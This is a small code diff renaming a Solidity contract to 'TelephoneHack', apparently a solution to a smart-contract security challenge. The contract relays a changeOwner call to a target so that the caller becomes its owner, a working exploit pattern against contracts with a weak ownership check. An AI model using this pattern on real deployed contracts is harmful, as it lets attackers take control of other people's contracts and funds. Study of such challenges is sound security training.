@@ -5,7 +5,7 @@ interface ITelephone {
     function changeOwner(address _owner) external;
 }
 
-contract IntermidiateContract {
+contract TelephoneHack {
     function changeOwner(address _addr) public {
         ITelephone(_addr).changeOwner(msg.sender);
     }
